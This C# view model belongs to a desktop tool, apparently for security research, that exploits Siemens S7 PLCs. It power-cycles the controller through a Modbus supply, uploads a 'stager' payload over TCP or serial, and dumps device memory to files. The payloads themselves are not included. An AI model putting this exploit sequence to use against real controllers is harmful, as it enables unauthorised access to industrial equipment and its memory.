using S7_Csharp_Utility.Services;
using System.Windows.Input;
using System.Threading.Tasks;
using System;
using S7.Net;
using System.ComponentModel.DataAnnotations;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Linq;
using System.IO.Ports;
using System.Threading;
using Avalonia.Threading;
using S7_Csharp_Utility.Models;

namespace S7_Csharp_Utility.ViewModels
{
    public class MainWindowViewModel : ViewModelBase
    {
        private const string ConfigFileName = "config.json";

        public PlcConnectionViewModel PlcConnectionViewModel { get; private set; }
        public ModbusPowerSupplyViewModel ModbusPowerSupplyViewModel { get; private set; }
        public ConfigurationViewModel ConfigurationViewModel { get; }
        public FileCompareViewModel FileCompareViewModel { get; }

        public LoggingService Logging { get; }
        public SocatLoggerService SocatLogging { get; }
        private readonly S7.Net.PayloadManager _payloadManager;

        private string _dumpAddress = "0x691E28";
        [Required]
        [RegularExpression(@"^0x[0-9a-fA-F]+$", ErrorMessage = "Must be a valid hex address (e.g., 0x10000000)")]
        public string DumpAddress
        {
            get => _dumpAddress;
            set { _dumpAddress = value; OnPropertyChanged(); }
        }

        private uint _dumpLength = 16;
        [Range(1, uint.MaxValue)]
        public uint DumpLength
        {
            get => _dumpLength;
            set { _dumpLength = value; OnPropertyChanged(); }
        }

        private bool _isUploadingStager;
        public bool IsUploadingStager
        {
            get => _isUploadingStager;
            set
            {
                _isUploadingStager = value;
                OnPropertyChanged();
                ((Commands.AsyncRelayCommand)StartExploitSequenceCommand).RaiseCanExecuteChanged();
                ((Commands.AsyncRelayCommand)DumpMemoryCommand).RaiseCanExecuteChanged();
            }
        }

        private bool _isDumpingMemory;
        public bool IsDumpingMemory
        {
            get => _isDumpingMemory;
            set
            {
                _isDumpingMemory = value;
                OnPropertyChanged();
                ((Commands.AsyncRelayCommand)DumpMemoryCommand).RaiseCanExecuteChanged();
                ((Commands.RelayCommand)CancelDumpCommand).RaiseCanExecuteChanged();
                ((Commands.AsyncRelayCommand)StartExploitSequenceCommand).RaiseCanExecuteChanged();
            }
        }

        private CancellationTokenSource? _dumpCancellationTokenSource;

        private bool _isComparing;
        public bool IsComparing
        {
            get => _isComparing;
            set
            {
                _isComparing = value;
                OnPropertyChanged();
                ((Commands.AsyncRelayCommand)FileCompareViewModel.CompareDumpsCommand).RaiseCanExecuteChanged();
                ((Commands.AsyncRelayCommand)FileCompareViewModel.CompareTwoFilesCommand).RaiseCanExecuteChanged();
                ((Commands.AsyncRelayCommand)DumpMemoryCommand).RaiseCanExecuteChanged();
                ((Commands.AsyncRelayCommand)StartExploitSequenceCommand).RaiseCanExecuteChanged();
            }
        }

        private double _dumpProgressPercentage;
        public double DumpProgressPercentage
        {
            get => _dumpProgressPercentage;
            set { _dumpProgressPercentage = value; OnPropertyChanged(); }
        }

        private string _dumpProgressBytes = "Read: 0 / 0 bytes";
        public string DumpProgressBytes
        {
            get => _dumpProgressBytes;
            set { _dumpProgressBytes = value; OnPropertyChanged(); }
        }

        private string _dumpProgressTime = "Elapsed: 0s | Remaining: calculating...";
        public string DumpProgressTime
        {
            get => _dumpProgressTime;
            set { _dumpProgressTime = value; OnPropertyChanged(); }
        }

        private bool _stagerInstalled;
        public bool StagerInstalled
        {
            get => _stagerInstalled;
            set
            {
                _stagerInstalled = value;
                OnPropertyChanged();
                ((Commands.AsyncRelayCommand)DumpMemoryCommand).RaiseCanExecuteChanged();
            }
        }

        public string PayloadsPath
        {
            get => _payloadsPath;
            set { _payloadsPath = value; OnPropertyChanged(); _ = ScanPayloadsAsync(); }
        }
        private string _payloadsPath = ApplicationConfiguration.GetPayloadsPath();

        public ObservableCollection<S7.Net.PayloadInfo> DiscoveredPayloads { get; } = new ObservableCollection<S7.Net.PayloadInfo>();

        private bool _isScanning;
        public bool IsScanning
        {
            get => _isScanning;
            set { _isScanning = value; OnPropertyChanged(); }
        }

        public string DumpsPath
        {
            get => _dumpsPath;
            set { _dumpsPath = value; OnPropertyChanged(); }
        }
        private string _dumpsPath = ApplicationConfiguration.GetDefaultDumpsPath();

        public string LogsPath
        {
            get => _logsPath;
            set
            {
                _logsPath = value;
                OnPropertyChanged();
                string resolvedPath = ApplicationConfiguration.ResolvePath(value, ApplicationConfiguration.GetDefaultLogsPath());
                Logging.UpdateLogsPath(resolvedPath);
                SocatLogging.UpdateLogsPath(resolvedPath);
            }
        }
        private string _logsPath = ApplicationConfiguration.GetDefaultLogsPath();

        public string ExtractionPath
        {
            get => _extractionPath;
            set { _extractionPath = value; OnPropertyChanged(); }
        }
        private string _extractionPath = ApplicationConfiguration.GetDefaultExtractionPath();

        public ICommand LoadProfileCommand { get; }
        public ICommand StartExploitSequenceCommand { get; }
        public ICommand DumpMemoryCommand { get; }
        public ICommand CancelDumpCommand { get; }

        private readonly Interfaces.IDialogService _dialogService;
        public ConfigurationService ConfigService { get; }

        private DeviceProfile? _loadedProfile;
        public DeviceProfile? LoadedProfile
        {
            get => _loadedProfile;
            set
            {
                _loadedProfile = value;
                OnPropertyChanged();
                OnPropertyChanged(nameof(MemoryRegions));
            }
        }

        public ObservableCollection<MemoryRegion> MemoryRegions => LoadedProfile?.Regions ?? new ObservableCollection<MemoryRegion>();

        private MemoryRegion? _selectedMemoryRegion;
        public MemoryRegion? SelectedMemoryRegion
        {
            get => _selectedMemoryRegion;
            set
            {
                _selectedMemoryRegion = value;
                OnPropertyChanged();
                if (_selectedMemoryRegion != null)
                {
                    DumpAddress = _selectedMemoryRegion.Address;
                    DumpLength = _selectedMemoryRegion.Size;
                }
            }
        }

        public MainWindowViewModel(LoggingService loggingService, PowerController powerController, S7.Net.PayloadManager payloadManager, Interfaces.IDialogService dialogService, SocatService socatService, ConfigurationService configService, SocatLoggerService socatLoggerService)
        {
            Logging = loggingService;
            SocatLogging = socatLoggerService;
            _payloadManager = payloadManager;
            _dialogService = dialogService;
            ConfigService = configService;

            PlcConnectionViewModel = new PlcConnectionViewModel(socatService, dialogService, loggingService);
            ModbusPowerSupplyViewModel = new ModbusPowerSupplyViewModel(powerController, dialogService, loggingService);
            ConfigurationViewModel = new ConfigurationViewModel(this, dialogService, configService);
            FileCompareViewModel = new FileCompareViewModel(this, dialogService, loggingService);

            if (PlcConnectionViewModel != null)
            {
                PlcConnectionViewModel.SocatStatusChanged += (status) =>
                {
                    ((Commands.AsyncRelayCommand)StartExploitSequenceCommand)?.RaiseCanExecuteChanged();
                };
            }
            if (ModbusPowerSupplyViewModel != null)
            {
                ModbusPowerSupplyViewModel.ModbusStatusChanged += (status) =>
                {
                    ((Commands.AsyncRelayCommand)StartExploitSequenceCommand)?.RaiseCanExecuteChanged();
                };
            }

            StartExploitSequenceCommand = new Commands.AsyncRelayCommand(_ => StartExploitSequenceAsync(), _ => PlcConnectionViewModel?.SocatStatus == "Running" && ModbusPowerSupplyViewModel?.ModbusStatus == "Connected" && !IsUploadingStager && !IsDumpingMemory && !IsComparing, HandleException);
            DumpMemoryCommand = new Commands.AsyncRelayCommand(_ => DumpMemoryAsync(), _ => StagerInstalled && !IsUploadingStager && !IsDumpingMemory && !IsComparing, HandleException);
            CancelDumpCommand = new Commands.RelayCommand(_ => CancelDump(), _ => IsDumpingMemory);
            LoadProfileCommand = new Commands.RelayCommand(async _ => await LoadProfile(), _ => !IsUploadingStager && !IsDumpingMemory && !IsComparing);
            
            _ = ScanPayloadsAsync();
        }

        private void HandleException(Exception ex)
        {
            Logging.Log($"An unexpected error occurred: {ex.ToString()}", LogCategory.Error);
            _dialogService.ShowMessageAsync("Unexpected Error", $"An unexpected error occurred: {ex.Message}");
        }

        private async Task LoadProfile()
        {
            var path = await _dialogService.ShowOpenFileDialogAsync("Load Profile", "json", "JSON Profiles");
            if (path != null)
            {
                var profile = await ConfigService.LoadProfileAsync(path);
                if (profile != null)
                {
                    LoadedProfile = profile;
                }
            }
        }

        private S7.Net.Interfaces.ICommunicationChannel? CreateCommunicationChannel()
        {
            if (PlcConnectionViewModel?.SelectedCommunicationMode == "TCP (socat)")
            {
                return new S7.Net.Channels.TcpChannel(PlcConnectionViewModel.PlcHost, PlcConnectionViewModel.PlcPort);
            }
            else if (PlcConnectionViewModel?.SelectedCommunicationMode == "Serial" && PlcConnectionViewModel.SelectedSerialPort != null)
            {
                return new S7.Net.Channels.SerialChannel(PlcConnectionViewModel.SelectedSerialPort, PlcConnectionViewModel.SelectedBaudRate, PlcConnectionViewModel.SelectedParity, PlcConnectionViewModel.SelectedStopBits, PlcConnectionViewModel.SelectedFlowControl);
            }
            return null;
        }
        
        private async Task StartExploitSequenceAsync()
        {
            if (ModbusPowerSupplyViewModel == null || PlcConnectionViewModel == null) return;

            IsUploadingStager = true;
            S7.Net.Interfaces.ICommunicationChannel? channel = null;
            try
            {
                Logging.Log("[EXPLOIT] Starting exploit sequence...", LogCategory.Info);
                await ModbusPowerSupplyViewModel.PowerCycleAsync(ModbusPowerSupplyViewModel.DelaySeconds);
                await Task.Delay(50);

                Logging.Log("[CONNECTION] Creating communication channel...", LogCategory.Info);
                channel = CreateCommunicationChannel();

                if (channel == null)
                {
                    throw new Exception("Could not create communication channel. PLC Connection View Model is not initialized.");
                }

                Logging.Log($"[CONNECTION] Connecting to PLC at {PlcConnectionViewModel.PlcHost}:{PlcConnectionViewModel.PlcPort}...", LogCategory.Info);
                await channel.ConnectAsync();

                if (!channel.IsConnected)
                {
                    throw new Exception("Failed to establish connection to PLC");
                }

                Logging.Log("[CONNECTION] ✅ Connected to PLC successfully", LogCategory.Info);
                var plcClient = new S7.Net.PlcClient(channel, message => Logging.Log(message, LogCategory.Info));
                await RunStagerSequenceAsync(plcClient);
            }
            catch (TimeoutException timeoutEx)
            {
                Logging.Log($"[ERROR] ⏱️ Timeout during stager sequence: {timeoutEx.ToString()}", LogCategory.Error);
                await _dialogService.ShowMessageAsync("Timeout Error",
                    $"The operation timed out. This may happen if:\n" +
                    $"• Socat is not running or has stopped\n" +
                    $"• PLC is not responding\n" +
                    $"• Network connection issues\n\n" +
                    $"Error: {timeoutEx.Message}");
            }
            catch (System.IO.IOException ioEx)
            {
                Logging.Log($"[ERROR] 🔌 Connection error during stager sequence: {ioEx.ToString()}", LogCategory.Error);
                await _dialogService.ShowMessageAsync("Connection Error",
                    $"Connection to PLC was lost. This may happen if:\n" +
                    $"• Socat process was stopped\n" +
                    $"• Network connection was interrupted\n" +
                    $"• PLC stopped responding\n\n" +
                    $"Error: {ioEx.Message}");
            }
            catch (Exception ex)
            {
                Logging.Log($"[ERROR] ❌ Unexpected error during stager sequence: {ex.ToString()}", LogCategory.Error);
                if (ex.InnerException != null)
                {
                    Logging.Log($"[ERROR] Inner exception: {ex.InnerException.ToString()}", LogCategory.Error);
                }
                await _dialogService.ShowMessageAsync("Error", $"An error occurred during the stager sequence: {ex.Message}");
            }
            finally
            {
                try
                {
                    channel?.Disconnect();
                    Logging.Log("[CONNECTION] Disconnected from PLC", LogCategory.Debug);
                }
                catch (Exception disconnectEx)
                {
                    Logging.Log($"[WARNING] Error during disconnect: {disconnectEx.Message}", LogCategory.Warning);
                }
                IsUploadingStager = false;
                Logging.Log("[EXPLOIT] Exploit sequence completed", LogCategory.Info);
            }
        }

        private async Task RunStagerSequenceAsync(S7.Net.PlcClient plcClient)
        {
            StagerInstalled = false;
            if (!plcClient.IsConnected) return;

            if (await plcClient.PerformHandshakeAsync())
            {
                await plcClient.GetVersion();

                byte[] stagerPayload = await _payloadManager.GetStagerPayloadAsync(PayloadsPath);
                Logging.Log($"Loaded stager payload ({stagerPayload.Length} bytes) from {PayloadsPath}.", LogCategory.Info);

                await plcClient.InstallStager(stagerPayload);
                StagerInstalled = true;
                Logging.Log("Stager is installed and ready.", LogCategory.Info);
            }
        }

        private async Task DumpMemoryAsync()
        {
            IsDumpingMemory = true;
            using (_dumpCancellationTokenSource = new CancellationTokenSource())
            {
                S7.Net.Interfaces.ICommunicationChannel? channel = null;

                DumpProgressPercentage = 0;
                DumpProgressBytes = "Read: 0 / 0 bytes";
                DumpProgressTime = "Elapsed: 0s | Remaining: calculating...";

                try
                {
                    if (!uint.TryParse(DumpAddress.Replace("0x", ""), System.Globalization.NumberStyles.HexNumber, System.Globalization.CultureInfo.CurrentCulture, out uint address))
                    {
                        Logging.Log("Error: Invalid dump address. Must be a valid hex number (e.g., 0x10000000).", LogCategory.Error);
                        await _dialogService.ShowMessageAsync("Validation Error", "Invalid dump address. Must be a valid hex number (e.g., 0x10000000).");
                        return;
                    }
                    if (DumpLength == 0)
                    {
                        Logging.Log("Error: Invalid dump length. Must be a positive number.", LogCategory.Error);
                        await _dialogService.ShowMessageAsync("Validation Error", "Invalid dump length. Must be a positive number.");
                        return;
                    }

                    channel = CreateCommunicationChannel();
                    if (channel == null)
                    {
                        throw new Exception("Could not create communication channel. PLC Connection View Model is not initialized.");
                    }
                    await channel.ConnectAsync();
                    var plcClient = new S7.Net.PlcClient(channel, message => Logging.Log(message, LogCategory.Info));
                    await RunDumpSequenceAsync(plcClient, address, DumpLength, _dumpCancellationTokenSource.Token);
                }
                catch (OperationCanceledException)
                {
                    Logging.Log("Memory dump operation was cancelled by user.", LogCategory.Info);
                }
                catch (Exception ex)
                {
                    var errorMessage = $"An error occurred during the dump sequence: {ex.Message}";
                    Logging.Log(errorMessage + Environment.NewLine + ex.ToString(), LogCategory.Error);
                    await _dialogService.ShowMessageAsync("Error", errorMessage);
                }
                finally
                {
                    channel?.Disconnect();
                    IsDumpingMemory = false;
                }
            }
            _dumpCancellationTokenSource = null;
        }

        private void CancelDump()
        {
            _dumpCancellationTokenSource?.Cancel();
        }

        private async Task RunDumpSequenceAsync(S7.Net.PlcClient plcClient, uint address, uint length, CancellationToken cancellationToken)
        {
            Logging.Log($"Starting memory dump of {length} bytes from 0x{address:X8}...", LogCategory.Info);

            byte[] dumperPayload = await _payloadManager.GetMemoryDumperPayloadAsync(PayloadsPath);
            Logging.Log($"Loaded dumper payload ({dumperPayload.Length} bytes) from {PayloadsPath}.", LogCategory.Info);

            var stopwatch = System.Diagnostics.Stopwatch.StartNew();
            var progress = new Progress<long>(bytesRead =>
            {
                double percentage = (double)bytesRead / length * 100;
                var elapsed = stopwatch.Elapsed;
                double bytesPerSecond = bytesRead > 0 ? bytesRead / elapsed.TotalSeconds : 0;
                double remainingSeconds = (bytesPerSecond > 0) ? (length - bytesRead) / bytesPerSecond : 0;

                Dispatch(() =>
                {
                    DumpProgressPercentage = percentage;
                    DumpProgressBytes = $"Read: {bytesRead} / {length} bytes";
                    DumpProgressTime = $"Elapsed: {elapsed.TotalSeconds:F0}s | Remaining: {remainingSeconds:F0}s";
                });
            });

            var dumpedData = await plcClient.DumpMemoryAsync(address, length, dumperPayload, progress);
            stopwatch.Stop();

            string resolvedDumpsPath = ApplicationConfiguration.ResolvePath(DumpsPath, ApplicationConfiguration.GetDefaultDumpsPath());
            string outFilename = $"mem_dump_{address:x8}_{address + length:x8}.bin";
            string fullPath = System.IO.Path.Combine(resolvedDumpsPath, outFilename);
            
            await System.IO.File.WriteAllBytesAsync(fullPath, dumpedData, cancellationToken);
            Logging.Log($"Successfully dumped {dumpedData.Length} bytes to {fullPath} in {stopwatch.Elapsed.TotalSeconds:F1}s.", LogCategory.Info);
        }

        public async Task LoadConfigurationOnStartup()
        {
            try
            {
                var path = System.IO.Path.Combine(AppContext.BaseDirectory, ConfigFileName);
                if (System.IO.File.Exists(path))
                {
                    await ConfigService.LoadConfiguration(this, path);
                }
                else
                {
                    await ConfigService.SaveConfiguration(this, path);
                    Logging.Log($"No configuration found. Created default configuration at {path}.", LogCategory.Info);
                }
            }
            catch (Exception ex)
            {
                Logging.Log($"Could not load or create configuration: {ex.ToString()}", LogCategory.Warning);
            }

            string resolvedLogsPath = ApplicationConfiguration.ResolvePath(LogsPath, ApplicationConfiguration.GetDefaultLogsPath());
            Logging.UpdateLogsPath(resolvedLogsPath);
            SocatLogging.UpdateLogsPath(resolvedLogsPath);
        }

        public async Task SaveConfigurationOnExit()
        {
            try
            {
                var path = System.IO.Path.Combine(AppContext.BaseDirectory, ConfigFileName);
                await ConfigService.SaveConfiguration(this, path);
            }
            catch (Exception ex)
            {
                Logging.Log($"Could not save configuration: {ex.ToString()}", LogCategory.Error);
            }
        }

        private async Task ScanPayloadsAsync()
        {
            if (IsScanning || string.IsNullOrWhiteSpace(PayloadsPath))
                return;

            IsScanning = true;
            
            try
            {
                var payloads = await Task.Run(() => _payloadManager.ScanPayloads(PayloadsPath));

                await Dispatcher.UIThread.InvokeAsync(() =>
                {
                    DiscoveredPayloads.Clear();
                    foreach (var payload in payloads)
                    {
                        DiscoveredPayloads.Add(payload);
                    }
                });

                Logging.Log($"Payload scan completed. Found {payloads.Count} payload files in {PayloadsPath}", LogCategory.Info);

                foreach (var payload in payloads)
                {
                    Logging.Log($"  - {payload.Type}: {payload.RelativePath} ({payload.Size} bytes)", LogCategory.Debug);
                }
            }
            catch (Exception ex)
            {
                Logging.Log($"Error scanning payloads: {ex.ToString()}", LogCategory.Error);
                await _dialogService.ShowMessageAsync("Error", $"Error scanning payloads: {ex.Message}");
            }
            finally
            {
                IsScanning = false;
            }
        }
    }
}
